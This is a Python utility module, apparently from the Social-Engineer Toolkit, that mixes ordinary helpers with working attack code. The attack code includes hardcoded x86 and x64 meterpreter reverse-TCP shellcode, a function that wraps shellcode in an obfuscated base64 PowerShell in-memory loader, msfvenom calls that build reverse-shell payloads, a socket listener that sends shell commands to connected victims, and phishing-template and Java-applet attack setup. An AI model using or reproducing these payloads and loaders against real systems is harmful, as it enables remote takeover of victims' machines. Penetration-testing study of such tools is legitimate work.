XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'
""" + bcolors.ENDC)
def set_check():
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
        if match:
            return True
        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
        if match1:
            return False
def menu_back():
    print_info("Returning to the previous menu...")
def custom_template():
    try:
        print ("         [****]  Custom Template Generator [****]\n")
        print (
            "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
        author = raw_input(setprompt("0", "Enter the name of the author"))
        filename = randomgen = random.randrange(1, 99999999999999999999)
        filename = str(filename) + (".template")
        subject = raw_input(setprompt("0", "Enter the subject of the email"))
        try:
            body = raw_input(setprompt(
                "0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
            while body != 'sdfsdfihdsfsodhdsofh':
                try:
                    body += (r"\n")
                    body += raw_input("Next line of the body: ")
                except KeyboardInterrupt:
                    break
        except KeyboardInterrupt:
            pass
        filewrite = open("src/templates/%s" % (filename), "w")
        filewrite.write("# Author: " + author + "\n#\n#\n#\n")
        filewrite.write('SUBJECT=' + '"' + subject + '"\n\n')
        filewrite.write('BODY=' + '"' + body + '"\n')
        print("\n")
        filewrite.close()
    except Exception as e:
        print_error("ERROR:An error occured:")
        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
def check_length(choice, max):
    counter = 0
    while 1:
        if counter == 1:
            choice = raw_input(bcolors.YELLOW + bcolors.BOLD +
                               "[!] " + bcolors.ENDC + "Invalid choice try again: ")
        try:
            choice = int(choice)
            if choice > max:
                choice = "blah"
                choice = int(choice)
            return choice
        except Exception:
            counter = 1
def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)
def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          (?:
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None
def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           # A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           # Another group
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           # Last group
            (?: (?<=::)             # Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          # A v4 address with NO leading zeros
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None
def kill_proc(port, flag):
    proc = subprocess.Popen("netstat -antp | grep '%s'" %
                            (port), shell=True, stdout=subprocess.PIPE)
    stdout_value = proc.communicate()[0]
    a = re.search(r"\d+/%s" % (flag), stdout_value)
    if a:
        b = a.group()
        b = b.replace("/%s" % (flag), "")
        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, shell=True).wait()
def check_config(param):
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        line = line.rstrip()
        if line.startswith(param) != "#":
            if line.startswith(param):
                line = line.rstrip()
                line = line.replace('"', "")
                line = line.replace("'", "")
                line = line.split("=", 1)
                return line[1]
def copyfolder(sourcePath, destPath):
    for root, dirs, files in os.walk(sourcePath):
        dest = destPath + root.replace(sourcePath, '')
        if not os.path.isdir(dest):
            os.mkdir(dest)
        for f in files:
            oldLoc = root + '/' + f
            newLoc = dest + '/' + f
            if not os.path.isfile(newLoc):
                try:
                    shutil.copy2(oldLoc, newLoc)
                except IOError:
                    pass
def check_options(option):
    trigger = 0
    if os.path.isfile(userconfigpath + "set.options"):
        fileopen = open(userconfigpath + "set.options", "r").readlines()
        for line in fileopen:
            match = re.search(option, line)
            if match:
                line = line.rstrip()
                line = line.replace('"', "")
                line = line.split("=")
                return line[1]
                trigger = 1
    if trigger == 0:
        return trigger
def update_options(option):
    if not os.path.isfile(userconfigpath + "set.options"):
        filewrite = open(userconfigpath + "set.options", "w")
        filewrite.write("")
        filewrite.close()
    fileopen = open(userconfigpath + "set.options", "r")
    old_options = ""
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = ""
        old_options = old_options + line
    filewrite = open(userconfigpath + "set.options", "w")
    filewrite.write(old_options + "\n" + option + "\n")
    filewrite.close()
def socket_listener(port):
    port = int(port)          # needed integer for port
    host = ''                 # Symbolic name meaning the local host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print("Listening on 0.0.0.0:%s" % str(port))
    s.listen(1000)
    conn, addr = s.accept()
    print('Connected by', addr)
    data = conn.recv(1024)
    while 1:
        command = raw_input("Enter shell command or quit: ")
        conn.send(command)
        if command == "quit":
            break
        data = conn.recv(1024)
        print(data)
    conn.close()
def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
    shellcode = metasploit_shellcode(payload, ipaddr, port)
    try:
        if not "http" in payload:
            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
        shellcode = re.sub("\\\\x", "0x", shellcode)
        shellcode = shellcode.replace("\\", "")
        counter = 0
        floater = ""
        newdata = ""
        for line in shellcode:
            floater = floater + line
            counter = counter + 1
            if counter == 4:
                newdata = newdata + floater + ","
                floater = ""
                counter = 0
        shellcode = newdata[:-1]
    except Exception as e:
        print_error("Something went wrong, printing error: " + str(e))
    var1 = "$" + generate_random_string(2, 2) # $1 
    var2 = "$" + generate_random_string(2, 2) # $c
    var3 = "$" + generate_random_string(2, 2) # $2
    var4 = "$" + generate_random_string(2, 2) # $3
    var5 = "$" + generate_random_string(2, 2) # $x
    var6 = "$" + generate_random_string(2, 2) # $t
    var7 = "$" + generate_random_string(2, 2) # $h
    var8 = "$" + generate_random_string(2, 2) # $z
    var9 = "$" + generate_random_string(2, 2) # $g
    var10 = "$" + generate_random_string(2, 2) # $i
    var11 = "$" + generate_random_string(2, 2) # $w
    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
        "$w", var11)
    return base64.b64encode(powershell_code.encode('utf_16_le')).decode("ascii")
def generate_shellcode(payload, ipaddr, port):
    msf_path = meta_path()
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    data = data.decode('ascii')
    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
             'unsignedcharbuf[]=', "b'", "'", '\\n']
    for repl in repls:
        data = data.replace(repl, "")
    return data
def shellcode_replace(ipaddr, port, shellcode):
    ip = ipaddr.split('.')
    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))
    if port != "443":
        port = hex(int(port))
        if len(port) == 5:
            port = port.replace("0x", "\\x0")
        else:
            port = port.replace("0x", "\\x")
        counter = 0
        new_port = ""
        for a in port:
            if counter < 4:
                new_port += a
            if counter == 4:
                new_port += "\\x" + a
                counter = 0
            counter = counter + 1
        port = new_port
    ipaddr = ipaddr.split(" ")
    first = ipaddr[0]
    if len(first) == 1:
        first = "0" + first
    second = ipaddr[1]
    if len(second) == 1:
        second = "0" + second
    third = ipaddr[2]
    if len(third) == 1:
        third = "0" + third
    fourth = ipaddr[3]
    if len(fourth) == 1:
        fourth = "0" + fourth
    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first, second, third, fourth)
    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)
    if port != "443":
        if len(port) > 4:
            port = "\\x00" + port
        if len(port) == 4:
            port = "\\x00\\x00" + port
        shellcode = shellcode.replace(r"\x00\x01\xbb", port)
    return shellcode
def exit_set():
    cleanup_routine()
    print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
          " with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n")
    sys.exit()
def metasploit_shellcode(payload, ipaddr, port):
    if payload == "windows/meterpreter/reverse_tcp":
        shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
    if payload == "windows/meterpreter/reverse_https":
        print_status(
            "Reverse_HTTPS takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)
    if payload == "windows/meterpreter/reverse_http":
        print_status(
            "Reverse_HTTP takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)
    if payload == "windows/meterpreter/reverse_tcp_allports":
        print_status(
            "Reverse TCP Allports takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)
    if payload == "windows/shell/reverse_tcp":
        print_status(
            "Reverse Shell takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)
    if payload == "windows/x64/meterpreter/reverse_tcp":
        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
    return shellcode
def encryptAES(secret, data):
    PADDING = '{'
    BLOCK_SIZE = 32
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    a = 50 * 5
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
    cipher = AES.new(secret)
    aes = EncodeAES(cipher, data)
    return str(aes)
def check_ports(filename, port):
    fileopen = open(filename, "r")
    data = fileopen.read()
    match = re.search("LPORT " + port, data)
    if match:
        return True
    else:
        return False
def setdir():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '.set' + '/')
    if check_os() == "windows":
        return "src/program_junk/"
userconfigpath = setdir()
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q), 8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b
def dec2bin(n, d=None):
    s = ""
    while n > 0:
        if n & 1:
            s = "1" + s
        else:
            s = "0" + s
        n >>= 1
    if d is not None:
        while len(s) < d:
            s = "0" + s
    if s == "":
        s = "0"
    return s
def bin2ip(b):
    ip = ""
    for i in range(0, len(b), 8):
        ip += str(int(b[i:i + 8], 2)) + "."
    return ip[:-1]
def printCIDR(c):
    parts = c.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    if subnet == 32:
        ipaddr = bin2ip(baseIP)
    else:
        ipPrefix = baseIP[:-(32 - subnet)]
        breakdown = ''
        for i in range(2**(32 - subnet)):
            ipaddr = bin2ip(ipPrefix + dec2bin(i, (32 - subnet)))
            ip_check = is_valid_ip(ipaddr)
            if ip_check != False:
                breakdown = breakdown + str(ipaddr) + ","
        return breakdown
def validateCIDRBlock(b):
    p = re.compile(r"^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        return False
    prefix, subnet = b.split("/")
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            return False
    if (int(subnet) < 1) or (int(subnet) > 32):
        print("Error: subnet " + str(subnet) + " wrong size.")
        return False
    return True
def get_sql_port(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(.2)
    try:
        sql_port = None
        try:
            port = 1434
            msg = "\x02\x41\x41\x41\x41"
            s.sendto(msg, (host, port))
            d = s.recvfrom(1024)
            sql_port = d[0].split(";")[9]
        except:
            sql_port = "1433"
            pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(.2)
            s.connect((host, int(sql_port)))
            return_host = host + ":" + sql_port
            if return_host != ":" + sql_port:
                return host + ":" + sql_port
        except:
            return None
    except Exception as err:
        print(err)
        pass
def capture(func, *args, **kwargs):
    """Capture the output of func when called with the given arguments.
    The function output includes any exception raised. capture returns
    a tuple of (function result, standard output, standard error).
    """
    stdout, stderr = sys.stdout, sys.stderr
    sys.stdout = c1 = io.StringIO()
    sys.stderr = c2 = io.StringIO()
    result = None
    try:
        result = func(*args, **kwargs)
    except:
        traceback.print_exc()
    sys.stdout = stdout
    sys.stderr = stderr
    return (result, c1.getvalue(), c2.getvalue())
def check_backbox():
    if os.path.isfile("/etc/issue"):
        backbox = open("/etc/issue", "r")
        backboxdata = backbox.read()
        if "BackBox" in backboxdata:
            return "BackBox"
        else:
            return "Non-BackBox"
    else:
        print("[!] Not running a Debian variant..")
        return "Non-BackBox"
def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = open("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        else:
            return "Non-Kali"
    else:
        print("[!] Not running a Debian variant..")
        return "Non-Kali"
def applet_choice():
    print("""
[-------------------------------------------]
Java Applet Configuration Options Below
[-------------------------------------------]
Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.
Select which option you want:
1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. I have my own code signing certificate or applet.\n""")
    choice1 = raw_input("Enter the number you want to use [1-3]: ")
    if choice1 == "":
        choice1 = "2"
    if choice1 == "1":
        try:
            import src.html.unsigned.self_sign
        except:
            module_reload(src.html.unsigned.self_sign)
    if choice1 == "2":
        print_status(
            "Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")
    if choice1 == "3":
        try:
            import src.html.unsigned.verified_sign
        except:
            module_reload(src.html.unsigned.verified_sign)
def module_reload(module):
    if sys.version_info >= (3, 0):
        import importlib
        importlib.reload(module)
    else:
        reload(module)
def input(string):
    return raw_input(string)
def fetch_template():
    fileopen = open(userconfigpath + "site.template").readlines()
    for line in fileopen:
        line = line.rstrip()
        match = re.search("URL=", line)
        if match:
            line = line.split("=")
            return line[1]
def tail(filename):
    if os.path.isfile(filename):
        file = open(filename, 'r')
        st_results = os.stat(filename)
        st_size = st_results[6]
        file.seek(st_size)
        while 1:
            where = file.tell()
            line = file.readline()
            if not line:
                time.sleep(1)
                file.seek(where)
            else:
                print(line,)  # already has newline
    else:
        print_error("File not found, cannot tail.")
def powershell_encodedcommand(ps_attack):
    ran1 = generate_random_string(1, 2)
    ran2 = generate_random_string(1, 2)
    ran3 = generate_random_string(1, 2)
    ran4 = generate_random_string(1, 2)
    full_attack = ('powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + ps_attack + '\'"')
    return full_attack